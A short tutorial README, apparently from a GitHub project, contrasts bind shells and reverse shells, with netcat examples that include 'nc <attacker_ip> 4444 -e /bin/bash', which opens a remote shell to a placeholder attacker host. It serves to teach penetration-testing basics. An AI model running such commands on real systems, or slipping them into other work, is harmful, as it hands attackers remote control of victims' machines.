#  Reverse Shell vs Bind Shell

##  What is a Shell?
A *shell* is basically a command-line interface that lets you run commands on a system.  
Attackers use **bind shells** and **reverse shells** to gain remote access after exploiting a vulnerability.

---

##  Bind Shell
- The **victim machine opens a port** and listens for incoming connections.  
- The **attacker connects** to this port and gets a shell.  

### Example (Netcat - Bind Shell):
On Victim:
```bash
nc -lvnp 4444 -e /bin/bash
```
On Attacker:
```bash
nc <victim_ip> 4444
```
### Limitations: Firewalls usually block incoming connections, so bind shells are less practical.

## Reverse Shell

The victim connects back to the attacker's machine.

The attacker sets up a listener and waits for the connection.

Once connected, the attacker gets a shell.

Example (Netcat - Reverse Shell):

On Attacker:
```bash
nc -lvnp 4444
```

On Victim (after exploit):
```bash
nc <attacker_ip> 4444 -e /bin/bash
```

## Additional Documentation

For a more detailed walkthrough, [view the full PDF guide](https://github.com/khajaazhar/Reverse-Bind-shell/blob/main/Shells.pdf).

---
## Disclaimer

This project was built for educational and authorized testing purposes only.

---

## Author

**Khaja Azhar Uddin**  
**Date:** Aug 2025

